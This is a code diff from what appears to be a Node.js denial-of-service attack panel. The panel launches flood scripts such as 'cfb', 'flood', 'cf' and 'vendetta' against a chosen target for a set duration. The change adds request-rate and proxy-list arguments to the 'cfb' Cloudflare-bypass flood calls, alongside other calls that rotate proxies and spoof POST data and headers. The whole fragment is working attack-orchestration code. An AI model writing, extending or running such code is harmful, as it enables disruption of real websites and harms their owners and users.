@@ -381,7 +381,7 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
 	  sigma()
 	  } else if (methods === 'cfb') {
        pushOngoing(target, methods, duration)
-	exec(`node ${metode} ${target} ${duration}`)
+	exec(`node ${metode} ${target} ${duration} 100 proxy.txt`)
 	  sigma()
 	  
 const flood = path.join(__dirname, `/lib/cache/flood.js`);
@@ -421,7 +421,7 @@ const cfb = path.join(__dirname, `/lib/cache/cfb.js`);
 	exec(`node ${lol} ${target} ${duration} 30 100 proxy.txt --proxy`)
 	exec(`node ${cf} POST ${target} proxy.txt ${duration} 30 100 cookie=mycookie postdata="param1=value1&param2=value2" randomstring=randomparam headerdata="Custom-Header=Value"`)
 	exec(`node ${vendetta} ${target} ${duration} 30 10 proxy.txt`)
-	exec(`node ${cfb} ${target} ${duration}`)
+	exec(`node ${cfb} ${target} ${duration} 100 proxy.txt`)
 	
 	
 	  
